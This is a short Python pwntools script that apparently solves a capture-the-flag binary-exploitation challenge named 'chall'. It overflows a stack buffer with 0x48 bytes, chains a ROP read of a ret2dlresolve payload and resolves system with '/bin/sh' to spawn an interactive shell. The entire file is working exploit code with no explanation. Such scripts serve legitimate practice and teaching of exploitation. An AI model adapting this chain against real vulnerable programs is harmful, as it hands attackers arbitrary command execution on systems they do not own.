from pwn import *

exe = ELF("./chall")
context.binary = exe

if args.GDB:
	r = gdb.debug("./chall", """
		c
	""")
else:
	r = process("./chall")

dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])
assert not dlresolve.unreliable
rop = ROP(exe)

payload = b"A" * 0x48
rop(rsi=dlresolve.data_addr)
rop.read()
rop.ret2dlresolve(dlresolve)
payload += rop.chain()
r.send(payload)
sleep(1)
r.send(dlresolve.payload)


r.interactive()
